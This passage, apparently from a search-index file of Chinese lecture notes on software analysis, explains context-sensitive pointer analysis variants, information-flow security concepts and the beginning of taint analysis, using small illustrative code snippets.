\u662f callee \u7684\u4e0a\u4e0b\u6587\u3002</p> <p></p> <p>\u4e94\u3001\u7b97\u6cd5</p> <p></p> <p>C.S.\u7684\u7b97\u6cd5\u53ea\u662f\u591a\u4e86\u4e0a\u4e0b\u6587\u9650\u5b9a\uff08\u7c7b\u4f3c \\(c:\\) \u8fd9\u6837\u7684\u90e8\u5206\uff09\u548c \\(Select\\) \u51fd\u6570\u3002\u4e24\u4e2a\u5e95\u5c42\u51fd\u6570 Propagate \u548c AddEdge \u5219\u5728\u4e24\u4e2a\u7b97\u6cd5\u4e2d\u5b8c\u5168\u76f8\u540c\u2014\u2014\u4e8b\u5b9e\u4e0a\uff0c\u5b83\u4fe9\u4ece\u8fc7\u7a0b\u5185 C.I.\u6307\u9488\u5206\u6790\u5f00\u59cb\u5c31\u6ca1\u53d8\u8fc7\u3002</p> <p>\u6211\u4eec\u5c06\u5728\u540e\u7eed\u8bb2\u89e3 \\(Select\\) \u51fd\u6570\u5728\u4e0d\u540c\u7b56\u7565\u4e0b\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <p>\u516d\u3001\u4e0a\u4e0b\u6587\u654f\u611f\u53d8\u4f53\uff08Context Sensitivity Variants\uff09</p> <p>\u5728\u672c\u8282\u6700\u5f00\u5934\uff0c\u4ecb\u7ecd\u4e86 Call-site sensitivity\uff0c\u4f46\u5176\u5b9e\u5b58\u5728\u5f88\u591a\u7684\u654f\u611f\u7b56\u7565\uff1a</p> <ul> <li>Call-site sensitivity</li> <li>Object sensitivity</li> <li>Type sensitivity</li> <li>\u2026\u2026</li> </ul> <p>\u5728\u5b66\u4e60\u8fd9\u4e9b\u5904\u7406\u65b9\u6cd5\u4e4b\u524d\uff0c\u518d\u770b\u4e00\u4e0b \\(Select\\) \u51fd\u6570\u7684\u8be6\u7ec6\u5b9a\u4e49\uff1a</p> \\[ c^t = Select(c,l,c':o_i) \\] <p>\u5176\u53c2\u6570\u5206\u522b\u4e3a\uff1a</p> <ul> <li>caller context</li> <li>call site</li> <li>receiver object with heap context</li> </ul> <p></p> <p>\u5728\u56fe\u4f8b\u4e2d\uff0c\u5f53\u6267\u884c\u7b2c\u4e8c\u884c\u7684\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u5176 Select \u7684\u7ed3\u679c\u5982\u56fe\u53f3\u6240\u793a\u3002</p> <p>\u73b0\u5728\uff0c\u53ef\u4ee5\u8ba4\u4e3a \u4e0a\u4e0b\u6587\u975e\u654f\u611f\u662f\u4e0a\u4e0b\u6587\u654f\u611f\u7684\u4e00\u79cd\u7279\u6b8a\u65b9\u5f0f\uff0c\u5373 \\(Select_(\\_,\\_,\\_) = [\\ ]\\)\uff0c\u4e5f\u5c31\u662f\u8bf4 Select \u51fd\u6570\u59cb\u7ec8\u8fd4\u56de\u7a7a\u4e0a\u4e0b\u6587\uff08\u65e0\u4e0a\u4e0b\u6587\uff09\u3002</p> <p>Select \u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u5e76\u4e0d\u662f\u5168\u662f\u5fc5\u987b\u7684\uff0c\u6839\u636e C.S. \u7b56\u7565\u9009\u62e9\u7684\u4e0d\u540c\uff0c\u9700\u8981\u4e0d\u540c\u7684\u53c2\u6570\u3002</p> <p>6.1 Call-Site Sensitivity\uff08K-CFA\uff09</p> <p>Call-site sensitivity \u7531 Olin Shivers \u4e8e 1991 \u5e74\u5728\u4ed6\u7684\u535a\u58eb\u8bba\u6587Control-Flow Analysis of Higher-Order Languages\u4e2d\u63d0\u51fa\uff0cCFA \u7684\u547d\u540d\u6b63\u662f\u6765\u6e90\u4e8e\u8be5\u8bba\u6587\u7684\u7f29\u5199\u3002</p> <p>\u5176\u601d\u60f3\u662f\uff0c\u6bcf\u4e2a\u4e0a\u4e0b\u6587\u90fd\u662f\u4e00\u4e2a call sites \u5217\u8868\uff08\u8c03\u7528\u94fe\uff09\uff0c\u5728\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u5c06 call site \u52a0\u5165\u5230 caller context \u4e2d\uff0c\u4f5c\u4e3a callee context\uff0c\u5b9e\u8d28\u4e0a\u5c31\u662f\u8c03\u7528\u6808\u7684\u62bd\u8c61\u3002\u5176 Select \u51fd\u6570\u4e3a</p> \\[ Select(\ud835\udc84,\ud835\udc8d,\\_) = [\ud835\udc59' , \u2026 , \ud835\udc59'',l] \\ where \\ \ud835\udc50' = [\ud835\udc59' , \u2026 , \ud835\udc59'' ] \\] <p>\u56e0\u4e3a\u4e0a\u4e0b\u6587\u5f62\u5982\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64 call-site sensitivity \u4e5f\u53eb\u505a call-string sensitivity\uff0c\u6216\u8005 K-CFA\u3002</p> <p>k-CFA \u5168\u79f0\u662f k-Limiting Context Abstraction\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u8981\u9650\u5236\u4e0a\u4e0b\u6587\u7684\u957f\u5ea6\u3002</p> <p>Call-site sensitivity \u7684\u7279\u6027\u5bfc\u81f4\u8fd9\u6837\u4ea7\u751f\u7684\u4e0a\u4e0b\u6587\u53ef\u80fd\u4f1a\u975e\u5e38\u957f\uff0c\u6bd4\u5982\u9012\u5f52\u7684\u60c5\u51b5\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u8981\u786e\u4fdd\u6307\u9488\u5206\u6790\u80fd\u591f\u7ec8\u6b62\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e0d\u5e0c\u671b\u4e0a\u4e0b\u6587\u8fc7\u957f\uff0c\u4e5f\u6ca1\u5fc5\u8981\u8fc7\u957f\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u4e3a\u4e0a\u4e0b\u6587\u957f\u5ea6\u8bbe\u7f6e\u4e00\u4e2a\u4e0a\u754c \\(k\\)\u2014\u2014\u6bcf\u4e2a\u4e0a\u4e0b\u6587\u53ea\u5305\u62ec\u6700\u65b0\u7684 \\(k\\) \u4e2a call sites\uff0c\u66f4\u65e9\u7684\u5c31\u4e22\u6389\u3002</p> <p>\u5b9e\u8df5\u4e2d\uff0c\\(k\\)\u901a\u5e38\u5c0f\u4e8e 3\u3002\u53e6\u5916\uff0c\u65b9\u6cd5\u4e0a\u4e0b\u6587\u548c\u5806\u4e0a\u4e0b\u6587\u53ef\u80fd\u91c7\u7528\u4e0d\u540c\u7684 \\(k\\)\u3002</p> <p>K-CFA \u7b56\u7565\u53ea\u9700\u8981\u4f7f\u7528 Select \u65b9\u6cd5\u7684\u524d\u4e24\u4e2a\u53c2\u6570\uff0c\u5373\uff1a</p> <ul> <li>caller context</li> <li>call site\uff1a\u4f7f\u7528\u4ee3\u7801\u6240\u5904\u7684\u884c\u6570\u4ee3\u8868\u3002</li> </ul> <p>\u5b9e\u8df5\u4e2d\uff0ck \u901a\u5e38\u53d6 1 \u6216 2\uff0c\u4e0b\u8ff0\u662f k = 1 \u7684\u4f8b\u5b50\uff1a</p> <p></p> <p>6.2 Object Sensitivity</p> <p>OK\uff0c\u63a5\u4e0b\u6765\u662f\u7b2c\u4e8c\u79cd C.S.\u5904\u7406\u65b9\u5f0f\uff1a\u5bf9\u8c61\u654f\u611f\u6027\u3002\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u5728 2002 \u5e74\u7684\u4e00\u7bc7\u8bba\u6587Parameterized Object Sensitivity for Points-to Analysis for Java\u88ab\u63d0\u51fa\uff0c\u601d\u8def\u4e0e\u524d\u4e00\u79cd\u622a\u7136\u4e0d\u540c\u2014\u2014\u7528\u62bd\u8c61\u5bf9\u8c61\uff08\u7531\u5bf9\u8c61 allocation sites \u8868\u793a\uff09\u5217\u8868\u6765\u6784\u6210\u4e0a\u4e0b\u6587\uff0c\u800c\u975e call sites \u6784\u6210\u3002\u5728\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u5c06\u63a5\u6536\u8005\u5bf9\u8c61\u548c\u5b83\u7684 heap context \u4f5c\u4e3a callee context\u3002</p> <p>\u5176 Select \u51fd\u6570\u4e3a\uff1a</p> \\[ Select(\\_,\\_,c':o_i) = [o_j , \u2026 , o_k,o_i] \\ where \\ \ud835\udc50' = [o_j , \u2026 , o_k ] \\] <p>\u7531\u4e8e\u62bd\u8c61\u5bf9\u8c61\u7531 allocation sites \u8868\u793a\uff0c\u56e0\u6b64\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u4e5f\u53eb\u505a allocation-site sensitivity\u3002\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u5904\u7406\u65b9\u5f0f\u3002</p> <p>\u6211\u4eec\u76f4\u63a5\u6765\u770b\u4e00\u4e2a 1-CFA \u548c 1-object \u5bf9\u6bd4\u7684\u4f8b\u5b50\u5427\uff1a</p> <p></p> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u4f3c\u4e4e object sensitivity \u66f4\u4e3a\u51c6\u786e\u3002Object sensitivity \u5176\u5b9e\u6a21\u62df\u7684\u5c31\u662f Java \u8bed\u8a00\u8fd0\u884c\u65f6\u7684\u52a8\u6001\u5904\u7406\u8fc7\u7a0b\u3002\u5177\u4f53\u5230\u8fd9\u4e2a\u4f8b\u5b50\u800c\u8a00\uff0c\u4e0d\u540c\u7684\u4e0a\u4e0b\u6587\u90fd\u53ef\u80fd\u6d41\u7ecf call-site [12]\uff0c\u7136\u800c 1-CFA \u5bfc\u81f4\u5386\u53f2\u4e0a\u4e0b\u6587\u88ab\u4e22\u6389\u4e86\uff0c\u51c6\u786e\u5ea6\u81ea\u7136\u4e0b\u964d\u3002\u589e\u52a0 k-CFA \u7684 *k*\u53ef\u4ee5\u7f13\u89e3\u95ee\u9898\uff0c\u4f46\u662f\u5e76\u4e0d\u80fd\u5b8c\u5168\u89e3\u51b3\u2014\u2014\u53ea\u8981\u7c7b\u4f3c\u7684\u8c03\u7528\u5c42\u6570\u6bd4 *k*\u5927\uff0c\u8fd9\u6837\u7684\u95ee\u9898\u90fd\u4f1a\u51fa\u73b0\u3002</p> <p>\u7136\u800c\uff0cobject sensitivity \u4e00\u5b9a\u6bd4 call-site sensitivity \u66f4\u51c6\u786e\u5417\uff1f\u4e0d\u89c1\u5f97\u3002\u7528 object sensitivity \u6765\u5904\u7406\u4e00\u4e0b\u4e0a\u4e00\u5c0f\u8282\u4e2d\u7684\u90a3\u4e2a\u4f8b\u5b50\uff0c\u5c06\u7ed3\u679c\u4e0e call-site sensitivity \u7684\u7ed3\u679c\u505a\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u6b21\u53cd\u800c object sensitivity \u662f\u4e0d\u51c6\u786e\u7684\u90a3\u4e2a\uff1a</p> <p></p> <p>\u7406\u8bba\u4e0a\uff0ccall-site sensitivity \u548c object sensitivity \u7684\u51c6\u786e\u6027\u662f\u4e0d\u53ef\u6bd4\u8f83\u7684\u3002</p> <p>\u5b9e\u8df5\u4e2d\uff0c\u5728\u5904\u7406 OOP \u65f6\uff0cobject sensitivityt \u4e00\u822c\u6bd4 call-site sensitivity \u7684\u6548\u679c\u66f4\u597d\uff08\u5177\u4f53\u5230\u4e2a\u4f8b\u5219\u53e6\u8bf4\uff09\u3002</p> <p>6.3 Type Sensitivity</p> <p>\u7b2c\u4e09\u79cd C.S.\u5904\u7406\u65b9\u5f0f\u662f\u7c7b\u578b\u654f\u611f\u6027\u3002\u4ece\u540d\u5b57\u4e0a\u6211\u4eec\u5c31\u5927\u6982\u80fd\u731c\u51fa\u6765\u5b83\u7684\u601d\u8def\uff0c\u751a\u81f3\u80fd\u591f\u731c\u5230\u5b83\u7684\u51c6\u786e\u6027\u53ef\u80fd\u4f1a\u6bd4 object sensitivity \u4f4e\u4e00\u4e9b\uff0c\u4f46\u662f\u6548\u7387\u4f1a\u9ad8\u4e00\u4e9b\u3002\u6240\u8c13\u7c7b\u578b\u654f\u611f\u6027\uff0c\u5c31\u662f\u4f7f\u7528\u5305\u542b allocation site \u7684\u201c\u7c7b\u578b\u201d\u548c\u5806\u4e0a\u4e0b\u6587\u4f5c\u4e3a callee object\u3002</p> <p>\u5176 Select \u51fd\u6570\u5982\u4e0b\uff1a</p> \\[ Select(\\_,\\_,c':o_i) = [\ud835\udc59' , \u2026 , \ud835\udc59'',InType(o_i)] \\ where \\ \ud835\udc50' = [\ud835\udc59' , \u2026 , \ud835\udc59'' ] \\] <p>\u8fd9\u79cd\u5904\u7406\u65b9\u5f0f\u5728 2011 \u5e74\u7684\u4e00\u7bc7\u8bba\u6587Pick YourContexts Well: Understanding Object-Sensitivity\u88ab\u63d0\u51fa\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u662f allocation site \u6240\u5904\u7684\u7c7b\u7684\u7c7b\u578b\uff0c\u4e0d\u662f\u63a5\u6536\u5bf9\u8c61\u7684\u7c7b\u578b\u3002\u4f8b\u5982\uff0c\u5728\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u4e2d\uff1a</p> <pre><code>1 class X {\n2     void m() {\n3         Y y = new Y();\n4     }\n5 }\n</code></pre> <p>\\(Intype(o_3) = X\\) \u800c\u975e \\(Y\\)</p> <p>\u56e0\u4e3a\u8fd9\u79cd\u65b9\u5f0f\u672c\u8d28\u4e0a\u662f Object-Sensitivity \u7684\u7701\u7565\uff0c\u56e0\u6b64\u5728\u76f8\u540c k-limiting \u6761\u4ef6\u4e0b\uff0ctype sensitivity \u7684\u51c6\u786e\u6027 \u4e0d\u9ad8\u4e8e object sensitivity\uff0c\u4f46\u5b9e\u8df5\u4e0a\u6765\u8bf4\uff0c\u51c6\u786e\u7387\u5e76\u4e0d\u4f1a\u4e0b\u964d\u592a\u591a\uff01</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_11","title":"\u9759\u6001\u5206\u6790\u5728\u5b89\u5168\u9886\u57df\u7684\u5e94\u7528","text":"<p>Dorothy E. Denning\u4e8e 1976 \u5e74\u5728\u8bba\u6587A Lattice Model of Secure Information Flow\u63d0\u51fa\uff0c\u4e00\u4e2a\u7cfb\u7edf\u9700\u8981\u8bbf\u95ee\uff08access\uff09\u548c\u6d41\uff08flow\uff09\u63a7\u5236\u6765\u6ee1\u8db3\u6240\u6709\u5b89\u5168\u8981\u6c42\u3002</p> <p>\u8bbf\u95ee\u63a7\u5236\uff08access control\uff09\u7528\u6765\u786e\u4fdd\u7a0b\u5e8f\u6709\u6743\u9650\u8bbf\u95ee\u7279\u5b9a\u4fe1\u606f\uff0c\u4e3b\u8981\u5173\u5fc3\u4fe1\u606f\u662f\u5982\u4f55\u88ab\u8bbf\u95ee\u7684\u3002</p> <p>\u4fe1\u606f\u6d41\u5b89\u5168\u5219\u662f\u4e00\u79cd\u7aef\u5230\u7aef\u7684\u601d\u8def\uff0c\u901a\u8fc7\u8ffd\u8e2a\u4fe1\u606f\u6d41\u901a\u8fc7\u4e00\u4e2a\u7a0b\u5e8f\u7684\u8fc7\u7a0b\uff0c\u786e\u4fdd\u8be5\u7a0b\u5e8f\u80fd\u591f\u5b89\u5168\u5730\u5904\u7406\u4fe1\u606f\uff0c\u4e3b\u8981\u5173\u5fc3\u4fe1\u606f\u662f\u5982\u4f55\u88ab\u4f20\u64ad\u7684\u3002</p> <p>Dorothy E. Denning \u4e0e Peter J. Denning \u592b\u5987\u4e8c\u4eba 1977 \u5e74\u7684\u8bba\u6587Certification of Programs for Secure Information Flow\u5bf9\u4fe1\u606f\u6d41\u505a\u4e86\u5982\u4e0b\u89e3\u91ca\uff1a\u5982\u679c\u53d8\u91cf x \u4e2d\u7684\u4fe1\u606f\u88ab\u4f20\u9001\u5230\u53d8\u91cf y\uff0c\u5b83\u4eec\u4e4b\u95f4\u5c31\u5efa\u7acb\u4e86\u4e00\u6761\u4fe1\u606f\u6d41 \\(x\u2192y\\)\u3002\u8fd9\u770b\u8d77\u6765\u4e0e\u6211\u4eec\u524d\u9762\u5b66\u8fc7\u7684\u6307\u9488\u5206\u6790\u5341\u5206\u76f8\u4f3c\u3002</p> <p>\u4e00\u79cd\u5c06\u4fe1\u606f\u6d41\u548c\u5b89\u5168\u8054\u7cfb\u8d77\u6765\u7684\u601d\u8def\u662f\uff0c\u5c06\u4e0d\u540c\u7c7b\u578b\u7684\u53d8\u91cf\u5212\u5206\u5230\u4e0d\u540c\u7684\u5b89\u5168\u7b49\u7ea7\uff08security levels\uff09\uff0c\u5728\u8fd9\u4e9b\u7b49\u7ea7\u4e4b\u95f4\u5efa\u7acb\u5141\u8bb8\u7684\u6d41\uff0c\u4ece\u800c\u5f62\u6210\u4fe1\u606f\u6d41\u7b56\u7565\u3002\u4e0d\u540c\u5b9e\u9645\u573a\u666f\u4e0b\u7684\u5b89\u5168\u7b49\u7ea7\u5343\u5dee\u4e07\u522b\uff0c\u53ef\u4ee5\u5f88\u590d\u6742\u4e5f\u53ef\u4ee5\u5f88\u7b80\u5355\u3002</p> <p>\u8003\u8651\u6700\u7b80\u5355\u7684\u60c5\u51b5\uff1a\u53ea\u6709 H\uff08\u9ad8\uff09\u548c L\uff08\u4f4e\uff09\u4e24\u4e2a\u5b89\u5168\u7b49\u7ea7\uff0c\u4e0b\u9762\u4e24\u884c\u4ee3\u7801\u5c31\u5206\u522b\u5bf9\u5e94\u4e86\u8fd9\u4e24\u4e2a\u7b49\u7ea7\uff1a</p> <pre><code>h = getPassword(); // h is high security\nbroadcast(l); // l is low security\n</code></pre> <p>\u53e6\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u683c\uff08lattice\uff09\u4e0a\u5bf9\u5b89\u5168\u7b49\u7ea7\u8fdb\u884c\u5efa\u6a21\uff08\u6765\u81ea\u524d\u9762\u63d0\u5230\u7684\u7b2c\u4e00\u7bc7\u8bba\u6587\uff09\uff1a\\(L \\leq H\\)</p> <p>\u6240\u8c13\u201c\u4fe1\u606f\u6d41\u7b56\u7565\u201d\uff0c\u7528\u6765\u9650\u5236\u4fe1\u606f\u6d41\u5728\u4e0d\u540c\u5b89\u5168\u7b49\u7ea7\u4e4b\u95f4\u7684\u6d41\u52a8\u3002\u4f8b\u5982\uff0cJ. A. Goguen \u548c J. Meseguer \u4e8e 1982 \u5e74\u5728\u8bba\u6587Security Policies and Security Models\u4e2d\u63d0\u51fa\u4e86\u4e00\u4e2a\u4fe1\u606f\u6d41\u7b56\u7565\u2014\u2014\u4e0d\u5e72\u6d89\u7b56\u7565\uff08noninterference policy\uff09\uff0c\u5b83\u8981\u6c42\u9ad8\u5b89\u5168\u7b49\u7ea7\u7684\u53d8\u91cf\u4e2d\u7684\u4fe1\u606f\u4e0d\u5e94\u5bf9\u4f4e\u5b89\u5168\u7b49\u7ea7\u7684\u53d8\u91cf\u4e2d\u7684\u4fe1\u606f\u6709\u4efb\u4f55\u5f71\u54cd\u3002\u56e0\u6b64\uff0c\u4f60\u4e5f\u4e0d\u5e94\u8be5\u80fd\u901a\u8fc7\u89c2\u5bdf\u4f4e\u5b89\u5168\u7b49\u7ea7\u7684\u53d8\u91cf\u6765\u83b7\u5f97\u4efb\u4f55\u9ad8\u5b89\u5168\u7b49\u7ea7\u7684\u4fe1\u606f\u3002\u5bf9\u5e94\u5230\u4ee3\u7801\u4e0a\uff0c\u5f62\u5982 \\(x_L = y_H\\) \u8fd9\u6837\u7684\u8bed\u53e5\u5c31\u8fdd\u80cc\u4e86\u8fd9\u4e00\u4fe1\u606f\u6d41\u7b56\u7565\u3002</p> <p>\u5728\u683c\u7684\u89c6\u89d2\u4e0b\uff0c\u4e0a\u8ff0\u7b56\u7565\u53ef\u4ee5\u8868\u8fbe\u4e3a\uff0c\u5e94\u786e\u4fdd\u4fe1\u606f\u5728\u5b89\u5168\u7b49\u7ea7\u7684\u683c\u4e2d\u5411\u4e0a\u6d41\u52a8\u3002</p> <p>\u673a\u5bc6\u6027\uff08Confidentiality\uff09\u548c\u5b8c\u6574\u6027\uff08Integrity\uff09</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u4fe1\u606f\u5b89\u5168\u4e09\u8981\u7d20\u5305\u62ec\u673a\u5bc6\u6027\uff08confidentiality\uff09\u3001\u5b8c\u6574\u6027\uff08integrity\uff09\u548c\u53ef\u7528\u6027\uff08availability\uff09\u3002\u672c\u8282\u8bfe\u8ba8\u8bba\u7684\u662f\u4fe1\u606f\u6d41\uff0c\u56e0\u6b64\u91cd\u70b9\u5173\u6ce8\u524d\u4e24\u4e2a\u8981\u7d20\u3002</p> <ul> <li> <p>\u786e\u4fdd\u673a\u5bc6\u6027\uff0c\u901a\u4fd7\u610f\u4e49\u4e0a\u5c31\u662f\u963b\u6b62\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff1b</p> </li> <li> <p>\u786e\u4fdd\u5b8c\u6574\u6027\uff0c\u5c31\u662f\u907f\u514d\u4e0d\u53d7\u4fe1\u7684\u4fe1\u606f\u6c61\u67d3\u4e86\u53d7\u4fe1\uff08\u91cd\u8981\uff09\u7684\u4fe1\u606f\uff08\u8fd9\u4e00\u8bf4\u6cd5\u6765\u81ea Ken Biba \u4e8e 1977 \u5e74\u53d1\u8868\u7684\u8bba\u6587Integrity Considerations for Secure Computer Systems\uff09\u3002</p> </li> </ul> <p>\u5e38\u89c1\u7684\u5404\u79cd\u6ce8\u5165\u95ee\u9898\u5c31\u662f\u635f\u5bb3\u4e86\u5b8c\u6574\u6027\u3002</p> <p>\u6709\u610f\u601d\u7684\u662f\uff0c\u7ed3\u5408\u524d\u9762\u8ba8\u8bba\u7684\u5b89\u5168\u7b49\u7ea7\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u770b\uff0c\u673a\u5bc6\u6027\u548c\u5b8c\u6574\u6027\u6070\u597d\u662f\u5bf9\u79f0\u7684\uff1a</p> <ul> <li>\u786e\u4fdd\u673a\u5bc6\u6027\uff0c\u5c31\u662f\u8981\u907f\u514d\u9ad8\u5b89\u5168\u7b49\u7ea7\u7684\u79d8\u5bc6\u4fe1\u606f\u6d41\u5411\u4f4e\u5b89\u5168\u7b49\u7ea7\u7684\u516c\u5f00\u533a\u57df\uff0c\u5c5e\u4e8e \u8bfb\u4fdd\u62a4\uff1b</li> <li>\u786e\u4fdd\u5b8c\u6574\u6027\uff0c\u5c31\u662f\u8981\u907f\u514d\u4f4e\u5b89\u5168\u7b49\u7ea7\u7684\u4e0d\u53ef\u4fe1\u4fe1\u606f\u6d41\u5411\u9ad8\u5b89\u5168\u7b49\u7ea7\u7684\u53ef\u4fe1\u533a\u57df\uff0c\u5c5e\u4e8e \u5199\u4fdd\u62a4\u3002</li> </ul> <p>\u53e6\u5916\uff0c\u5b8c\u6574\u6027\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u8986\u76d6\u5e7f\u6cdb\u7684\u6982\u5ff5\u3002\u5b83\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u7684\u6b63\u786e\u6027\uff08correctness\uff09\u3001\u5b8c\u5168\u6027\uff08completeness\uff09\u548c\u4e00\u81f4\u6027\uff08consistency\uff09\u3002</p> <p>\u663e\u5f0f\u6d41\uff08Explicit Flows\uff09\u548c\u9690\u853d\u4fe1\u9053\uff08Covert Channels\uff09</p> <p>\u6211\u4eec\u7ee7\u7eed\u6765\u8ba8\u8bba\u4fe1\u606f\u6d41\u3002\u201c\u4fe1\u606f\u201d\u672c\u8eab\u662f\u4e00\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff0c\u5b83\u5e76\u4e0d\u7b49\u540c\u4e8e\u6570\u636e\u3002\u4fe1\u606f\u53ef\u80fd\u4f1a\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u4f20\u64ad\u65b9\u5f0f\uff1a\u663e\u5f0f\u6d41\u548c\u9690\u5f0f\u6d41\uff08implicit flow\uff09\u3002</p> <ul> <li> <p>\u663e\u5f0f\u6d41\u5f88\u7b80\u5355\uff0c\u4f8b\u5982\uff0c\\(x_L = y_H\\) \u8fd9\u4e2a\u8bed\u53e5\u5c31\u662f\u901a\u8fc7\u76f4\u63a5\u590d\u5236/\u8d4b\u503c\u7684\u65b9\u5f0f\u5b9e\u73b0\u4fe1\u606f\u4f20\u9012</p> </li> <li> <p>\u9690\u5f0f\u6d41\u5219\u4e0d\u90a3\u4e48\u76f4\u89c2\uff0c\u57fa\u4e8e\u6b64\u9014\u5f84\u7684\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u4e5f\u76f8\u5bf9\u800c\u8a00\u4e0d\u90a3\u4e48\u597d\u9632\u5fa1\u3002\u73b0\u5b9e\u4e2d\u5df2\u7ecf\u6709\u8bb8\u591a\u8fd9\u6837\u7684\u4f8b\u5b50\u3002\u4f8b\u5982\uff0c\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u4e2d\uff0c\u6839\u636e <code>public_L</code> \u7684\u7ed3\u679c\uff0c\u6211\u4eec\u5c06\u80fd\u591f\u63a8\u65ad <code>secret_H</code>\u7684\u6b63\u8d1f\u6027\uff1a</p> </li> </ul> <pre><code>secret_H = getSecret();\nif (secret_H &lt; 0) publik_L = 1;\nelse publik_L = 0;\n</code></pre> <p>\u654f\u611f\u4fe1\u606f\u867d\u7136\u6ca1\u6709\u76f4\u63a5\u4f20\u64ad\uff0c\u4f46\u662f\u5b83\u5f71\u54cd\u4e86\u63a7\u5236\u6d41\uff0c\u8fd9\u53ef\u80fd\u4f1a\u88ab\u4f4e\u5b89\u5168\u7b49\u7ea7\u7684\u89c2\u5bdf\u8005\u89c2\u5bdf\u5230\u3002</p> <p>\u901a\u8fc7\u8ba1\u7b97\u7cfb\u7edf\u4f20\u9012\u4fe1\u606f\u7684\u673a\u5236\u88ab\u79f0\u4f5c\u4fe1\u9053\uff08channels\uff09\u3002\u5728\u6b64\u57fa\u7840\u4e0a\uff0cButler W.Lampson \u4e8e 1973 \u5e74\u53d1\u8868\u7684\u6587\u7ae0A Note on the Confinement Problem\u5c06\u90a3\u4e9b\u5229\u7528\u672c\u975e\u7528\u4e8e\u4fe1\u606f\u4f20\u9012\u7684\u673a\u5236\u7684\u4fe1\u9053\u79f0\u4e3a\u9690\u853d\u4fe1\u9053\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u9690\u853d\u4fe1\u9053\u5305\u62ec\uff1a</p> <ul> <li>\u9690\u5f0f\u6d41\uff0c\u901a\u8fc7\u7a0b\u5e8f\u63a7\u5236\u7ed3\u6784\u4f20\u9012\u4fe1\u606f\u3002</li> <li>\u7ec8\u6b62\uff08termination\uff09\u4fe1\u9053\uff0c\u901a\u8fc7\u7a0b\u5e8f\u7684\uff08\u4e0d\uff09\u53ef\u7ec8\u6b62\u6027\u5dee\u5f02\u4f20\u9012\u4fe1\u606f\u3002</li> <li>\u65f6\u95f4\uff08timing\uff09\u4fe1\u9053\uff0c\u901a\u8fc7\u8ba1\u7b97\u65f6\u95f4\u7684\u5dee\u5f02\u4f20\u9012\u4fe1\u606f\u3002</li> <li>\u5f02\u5e38\uff08exceptions\uff09\uff0c\u901a\u8fc7\u5f02\u5e38\u6765\u4f20\u9012\u4fe1\u606f\u3002</li> </ul> <p>\u5c3d\u7ba1\u9690\u853d\u4fe1\u9053\u6bd4\u8f83\u96be\u8bc6\u522b\u548c\u9632\u5fa1\uff0c\u5b83\u80fd\u591f\u4f20\u9012\u7684\u4fe1\u606f\u901a\u5e38\u4e5f\u6bd4\u663e\u5f0f\u6d41\u5c11\u5f97\u591a\u3002\u56e0\u6b64\uff0c\u672c\u8bfe\u7a0b\u4e3b\u8981\u5173\u6ce8\u663e\u5f0f\u6d41\u3002\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u5982\u4f55\u68c0\u6d4b\u548c\u907f\u514d\u975e\u9884\u671f\u7684\u4fe1\u606f\u6d41\u5462\uff1f\u63a5\u4e0b\u6765\u5c06\u8981\u8ba8\u8bba\u7684\u6c61\u70b9\u5206\u6790\u662f\u6709\u6548\u7684\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_12","title":"\u6c61\u70b9\u5206\u6790","text":"<p>\u6c61\u70b9\u5206\u6790\u662f\u6700\u5e38\u89c1\u7684\u4fe1\u606f\u6d41\u5206\u6790\u6280\u672f\u4e4b\u4e00\u3002\u5b83\u5c06\u7a0b\u5e8f\u6570\u636e\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ol> <li>\u611f\u5174\u8da3\u7684\u6570\u636e\uff0c\u5e26\u6709\u67d0\u4e9b\u6807\u7b7e\uff0c\u4e5f\u53eb\u505a\u6c61\u70b9\u6570\u636e\u3002</li> <li>\u5176\u4ed6\u6570\u636e\uff0c\u6216\u8005\u53eb\u65e0\u6c61\u70b9\u6570\u636e\u3002</li> </ol> <p>\u6c61\u70b9\u6570\u636e\u7684\u6e90\u5934\u79f0\u4e3a sources\u3002\u5b9e\u9645\u573a\u666f\u4e2d\uff0c\u6c61\u70b9\u6570\u636e\u901a\u5e38\u6765\u81ea\u67d0\u4e9b\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u3002</p> 